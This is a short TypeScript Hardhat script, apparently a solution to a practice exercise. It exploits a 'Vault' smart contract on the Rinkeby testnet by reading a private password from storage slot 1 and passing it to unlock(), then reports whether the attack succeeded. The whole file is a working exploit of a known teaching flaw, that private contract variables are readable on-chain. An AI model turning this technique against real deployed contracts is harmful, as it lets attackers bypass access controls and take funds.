import "@ethersproject/abstract-provider"
import { deployments, ethers, getNamedAccounts, network } from "hardhat"


import * as dotenv from 'dotenv'
import { cancelLastAccountTransaction } from "./utils";
dotenv.config()


const executeExploit= async()=>{
    if(network.name==="rinkeby"){
        const {exploiter}= await getNamedAccounts()
        const exploiterAcc= await ethers.getSigner(exploiter)
        const vault = await ethers.getContractAt('Vault',process.env.VAULT_ADDRESS as string)
        
        console.log(`Slot 0: ${await ethers.provider.getStorageAt(vault.address,0)}`)
        console.log(`Slot 1: ${await ethers.provider.getStorageAt(vault.address,1)}`)
        
        const tx=await vault.connect(exploiterAcc).unlock(await ethers.provider.getStorageAt(vault.address,1),{
            gasPrice: (await ethers.provider.getGasPrice()).mul(10)
        })
        
        console.log(`Transaction hash: ${tx.hash}`)
        //const reciept=await tx.wait()
        //console.log(reciept)

        if((await vault.locked())===false){
            console.log("Successful attack")
        }else{
            console.log("Attack failed")
        }
    }else{
        console.log("This script can only be executed in rinkeby network")
    }
    // */
    
}

executeExploit().then(()=>process.exit(0)).catch(err=>console.log(err))
